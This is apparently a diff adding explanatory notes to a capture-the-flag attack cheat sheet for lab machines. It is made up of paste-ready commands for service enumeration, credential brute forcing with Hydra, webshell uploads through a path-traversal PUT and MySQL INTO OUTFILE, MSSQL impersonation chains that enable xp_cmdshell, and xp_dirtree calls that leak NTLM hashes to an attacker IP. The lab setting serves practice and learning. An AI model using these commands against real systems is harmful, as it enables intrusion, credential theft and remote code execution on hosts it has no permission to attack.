@@ -35,12 +35,14 @@ echo "$target $domain ns.$domain int-ftp.$domain mail.$domain" | sudo tee -a /et
 
 nmap -Pn -sC -sV -p- --min-rate 2000 -oA /tmp/scan $target
 ```
+> Set `target` and `domain` as shell variables first so every paste-ready command below works without edits. `--min-rate 2000` speeds up full port scanning. `-oA` saves results in all three nmap formats.
 
 ### DNS (port 53)
 ```bash
 dig AXFR @$target $domain                    # leaks internal hosts → MORE TARGETS
 dig any @$target $domain
 ```
+> `AXFR` requests a full zone transfer — if allowed, dumps every DNS record. Replace `$domain` with the target domain. Add any new hostnames found to `/etc/hosts`.
 
 ### SMB (445)
 ```bash
@@ -49,6 +51,7 @@ nxc smb $target -u 'guest' -p ''  --shares           # ⚡ Server 2019 default
 smbclient -N -L //$target
 smbclient -N //$target/SHARE -c 'prompt OFF; recurse ON; mget *'
 ```
+> Try null session first, then `guest:''` — Server 2019 often allows guest. Replace `SHARE` with the share name from `--shares`. `mget *` downloads everything recursively.
 
 ### SMTP (25/587)
 ```bash
@@ -56,6 +59,7 @@ smtp-user-enum -M RCPT -U /tmp/htb_lists/users.list -t $target -D $domain
 smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $target
 # fallback list: /usr/share/seclists/Usernames/Names/names.txt (10713 names)
 ```
+> `-M RCPT` uses the RCPT TO method for enumeration. `-U` is the username wordlist. `-D` sets the target domain — required for hMailServer. Try RCPT first, fall back to VRFY if it fails.
 > hMailServer drops RCPT for non-local domains → `-D <domain>` is MANDATORY.
 > Manual `swaks` RCPT often fails (530 AUTH); `smtp-user-enum` works because it sends MAIL FROM first.
 
@@ -67,6 +71,7 @@ for p in 21 2121 30021; do
 done
 ftp -n $target <port>           # then: user anonymous; passive; ls; mget *
 ```
+> The loop tests anonymous FTP on three common ports in one shot. `--max-time 5` prevents hanging. If curl shows a directory listing, that port allows anonymous access. Replace `<port>` with the working port.
 > **Try EVERY FTP port with anonymous.** One may reject, another accepts.
 
 ### MSSQL (1433)
@@ -75,6 +80,7 @@ nxc mssql $target -u guest -p '' --local-auth           # blank
 nxc mssql $target -u sa    -p '' --local-auth
 mssqlclient.py -windows-auth USER@$target               # impacket
 ```
+> `--local-auth` authenticates against local SQL/Windows accounts rather than domain accounts. Try blank credentials on `guest` and `sa` before spraying. Use `mssqlclient.py` for an interactive shell once you have valid creds.
 
 ### Other quick wins
 ```bash
@@ -83,6 +89,7 @@ showmount -e $target                # NFS
 onesixtyone -c community.txt $target
 ldapsearch -H ldap://$target -x -s base namingcontexts
 ```
+> `snmpwalk -v2c -c public` enumerates SNMP with the default community string. `showmount -e` lists NFS exports. `onesixtyone` brute-forces SNMP community strings. `ldapsearch` shows the base naming context for LDAP enumeration.
 
 ---
 
@@ -99,6 +106,7 @@ printf '%s\n' sa john fiona simon administrator root admin > /tmp/loot/users.txt
 grep -oE '[A-Za-z][A-Za-z0-9._-]{2,}' */*.txt | sort -u >> /tmp/loot/users.txt
 sort -u /tmp/loot/users.txt -o /tmp/loot/users.txt
 ```
+> Dump all text from loot files, strip Windows line endings, and sort unique into a password list. Use `grep -oE` to extract word-like strings (potential usernames) from file contents. Add known service usernames (`sa`, `administrator`) manually.
 
 ---
 
@@ -122,7 +130,7 @@ hydra -L users.txt -P pws.txt $target https-get / -t 4 -F
 # Last resort: rockyou (only after loot fails)
 hydra -l USER -P /usr/share/wordlists/rockyou.txt -f ftp://$target
 ```
-
+> `-L` is a username list, `-P` is a password list, `-t 4` limits threads (prevents lockouts), `-F` stops on first valid credential. `--continue-on-success` for nxc keeps going to find all valid pairs.
 > If SSH rejects but POP3 accepts → still a foothold. Linux ACS boxes often have `PasswordAuthentication no` for some users — Dovecot is the easiest backdoor.
 > **`--local-auth` is required** when MSSQL login is mapped to a Windows local account (not a SQL login). And remember `sa` is often disabled.
 
@@ -140,6 +148,7 @@ curl -k -X PUT -H "Host: $target" --basic -u USER:PASS \
   "https://$target/../../../xampp/htdocs/shell.php"
 curl "http://$target/shell.php?c=type+C:\Users\Administrator\Desktop\flag.txt"
 ```
+> `-k` ignores SSL cert errors. `-X PUT` uploads the file. `--path-as-is` is REQUIRED — without it, curl normalizes the `../` traversal away. Replace `USER:PASS` with valid Core FTP credentials.
 > `--path-as-is` is **REQUIRED** (otherwise curl collapses `../`). XAMPP Apache runs as **SYSTEM** by default.
 
 ### MySQL / MariaDB → INTO OUTFILE webshell
@@ -147,6 +156,7 @@ curl "http://$target/shell.php?c=type+C:\Users\Administrator\Desktop\flag.txt"
 mysql -h $target -u USER -pPASS --ssl=FALSE -e \
  "SELECT \"<?php echo shell_exec(\$_GET['c']);?>\" INTO OUTFILE 'C:\\\\xampp\\\\htdocs\\\\sh.php';"
 ```
+> `--ssl=FALSE` avoids SSL negotiation errors. `-e` runs the query non-interactively. `INTO OUTFILE` writes to a path on the server — the webroot path lets you access the shell via browser. The MySQL user needs FILE privilege.
 > Don't brute MariaDB early — `max_connect_errors` will ban your VPN IP.
 
 ### MSSQL — full enum + privesc playbook
@@ -162,6 +172,7 @@ nxc mssql $target -u U -p P -q "
 
 nxc mssql $target -u U -p P -q "SELECT name, is_linked, data_access FROM sys.servers"
 ```
+> First query checks if your login is sysadmin. If not, the second query finds logins you can impersonate (`EXECUTE AS LOGIN`). The third finds linked servers. Replace `U` and `P` with your valid MSSQL credentials.
 
 **Self-linked-server / impersonation chain** (the Hard trick):
 ```sql
@@ -171,6 +182,7 @@ EXECUTE AS LOGIN='john'; EXEC ('sp_configure ''show advanced options'',1; RECONF
 EXECUTE AS LOGIN='john'; EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE')        AT [LINKED.SRV]
 EXECUTE AS LOGIN='john'; EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LINKED.SRV]
 ```
+> `EXECUTE AS LOGIN` impersonates a privileged login. `EXEC ('...') AT [linked_server]` runs the query on the linked server while preserving the impersonated context. Replace `john` and `[LINKED.SRV]` with your enumerated login and linked server name.
 **Rules:**
 - Run each statement as a SEPARATE `nxc -q` (don't chain `sp_configure` inside one `EXEC ('...')` — parser chokes).
 - Doubled single quotes inside `EXEC ('...')`.
@@ -193,6 +205,7 @@ EXEC xp_cmdshell 'whoami';
 EXEC xp_dirtree '\\10.10.14.X\share\',1,1
 EXEC xp_subdirs '\\10.10.14.X\x'
 ```
+> Enable `xp_cmdshell` in two steps — first enable advanced options, then enable the feature. Run each as a separate statement. `xp_dirtree` and `xp_subdirs` force NTLM authentication to your Responder listener to capture hashes. Replace `10.10.14.X` with your tun0 IP.
 
 ### ProFTPD
 - Two instances are common (e.g. 2121 + 30021). Anon may differ per port.
